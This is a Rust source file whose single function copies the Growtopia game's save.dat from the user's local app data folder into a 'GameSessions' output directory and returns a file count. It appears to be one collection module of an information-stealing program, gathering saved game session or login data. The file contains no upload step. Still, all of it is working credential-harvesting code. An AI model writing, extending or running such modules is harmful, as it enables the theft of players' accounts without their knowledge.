use std::path::{Path, PathBuf};
use std::fs;

pub fn extract(output_dir: &Path) -> usize {
    let local_app_data = match std::env::var("LOCALAPPDATA") {
        Ok(p) => PathBuf::from(p),
        Err(_) => return 0,
    };

    let save_file = local_app_data.join("Growtopia").join("save.dat");
    if !save_file.exists() {
        return 0;
    }

    let dest_dir = output_dir.join("GameSessions").join("Growtopia");
    fs::create_dir_all(&dest_dir).ok();

    if fs::copy(&save_file, dest_dir.join("save.dat")).is_ok() {
        1
    } else {
        0
    }
}
